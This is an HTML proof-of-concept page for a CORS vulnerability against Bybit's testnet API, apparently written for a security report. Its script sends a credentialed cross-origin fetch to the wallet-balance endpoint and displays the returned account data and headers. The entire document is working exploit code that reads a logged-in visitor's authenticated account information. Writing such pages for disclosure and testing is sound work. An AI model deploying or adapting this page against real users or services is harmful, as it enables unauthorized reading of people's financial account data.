<!DOCTYPE html>
<html>
<head><title>Bybit CORS PoC</title></head>
<body>
<h2>Bybit CORS PoC — darivxe</h2>
<p><strong>Testnet raw response:</strong></p>
<pre id="testnet-out">fetching...</pre>
<p><strong>Testnet response headers:</strong></p>
<pre id="testnet-headers">fetching...</pre>

<script>
fetch("https://api-testnet.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
  credentials: "include"
})
.then(r => {
  // capture headers
  let hdrs = "";
  r.headers.forEach((v, k) => hdrs += k + ": " + v + "\n");
  document.getElementById("testnet-headers").textContent = hdrs;
  return r.text();
})
.then(data => {
  document.getElementById("testnet-out").textContent = data || "(empty body)";
})
.catch(e => {
  document.getElementById("testnet-out").textContent = "CORS blocked or error: " + e;
});
</script>
</body>
</html>
